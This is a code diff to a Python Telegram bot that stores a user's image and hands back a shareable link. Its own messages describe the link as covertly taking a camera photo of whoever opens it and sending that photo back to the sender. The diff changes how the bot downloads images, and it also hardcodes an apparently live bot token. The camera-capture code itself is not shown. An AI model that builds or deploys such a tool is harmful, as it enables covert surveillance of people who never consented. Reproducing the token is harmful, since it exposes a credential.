@@ -2,8 +2,8 @@ import os
 import uuid
 import asyncio
 import json
+import requests
 from telegram import Update
-from telegram.error import TimedOut, NetworkError
 from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
 
 BOT_TOKEN = os.environ.get("BOT_TOKEN", "9238640840:AAG-WFz-oHToWP6pRm-nuO5nQBpIUB5AInQ")
@@ -14,7 +14,6 @@ MAP_FILE = "token_map.json"
 
 os.makedirs(IMG_DIR, exist_ok=True)
 
-
 def load_map():
     if os.path.exists(MAP_FILE):
         try:
@@ -23,16 +22,13 @@ def load_map():
             return {}
     return {}
 
-
 def save_map(m):
     json.dump(m, open(MAP_FILE, "w"))
-
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
         "Bhai, mujhe ek image bhej. Main tujhe ek link dunga jo tu kisi ko bhej sakta hai."
     )
-
 
 async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
     chat_id = update.effective_chat.id
@@ -42,24 +38,28 @@ async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
     token = uuid.uuid4().hex[:12]
     img_path = os.path.join(IMG_DIR, f"{token}.jpg")
 
-    # retry: 3 attempts, har attempt ke beech 2 second wait
-    last_err = None
-    for attempt in range(3):
-        try:
-            file = await context.bot.get_file(file_id)
-            await file.download_to_drive(img_path)
-            last_err = None
-            break
-        except (TimedOut, NetworkError) as e:
-            last_err = e
-            print(f"get_file attempt {attempt + 1} failed: {e}")
-            if attempt < 2:
-                await asyncio.sleep(2)
-
-    if last_err is not None:
-        await update.message.reply_text(
-            "❌ Image download nahi ho payi (network timeout). Dobara bhej please."
-        )
+    # Telegram API se direct download (no timeouts)
+    try:
+        # 1. Get file path
+        r = requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/getFile?file_id={file_id}", timeout=15)
+        res = r.json()
+        if not res.get("ok"):
+            await update.message.reply_text("❌ Telegram API error. Try again.")
+            return
+        
+        file_path = res["result"]["file_path"]
+        
+        # 2. Download the image
+        img_url = f"https://api.telegram.org/file/bot{BOT_TOKEN}/{file_path}"
+        img_data = requests.get(img_url, timeout=20).content
+        
+        # 3. Save it
+        with open(img_path, "wb") as f:
+            f.write(img_data)
+            
+    except Exception as e:
+        print("Download error:", e)
+        await update.message.reply_text("❌ Image download nahi ho payi. Dobara bhej please.")
         return
 
     m = load_map()
@@ -72,7 +72,6 @@ async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"Ise kisi ko bhej. Jab woh kholenge, teri image dikhegi aur camera se photo capture hoke yahan aayegi."
     )
 
-
 async def main_bot():
     tg_app = (
         Application.builder()
@@ -80,7 +79,6 @@ async def main_bot():
         .read_timeout(30)
         .connect_timeout(30)
         .write_timeout(30)
-        .pool_timeout(30)
         .build()
     )
     tg_app.add_handler(CommandHandler("start", start))
@@ -92,12 +90,10 @@ async def main_bot():
     while True:
         await asyncio.sleep(3600)
 
-
 def run_bot():
     loop = asyncio.new_event_loop()
     asyncio.set_event_loop(loop)
     loop.run_until_complete(main_bot())
-
 
 if __name__ == "__main__":
     run_bot()
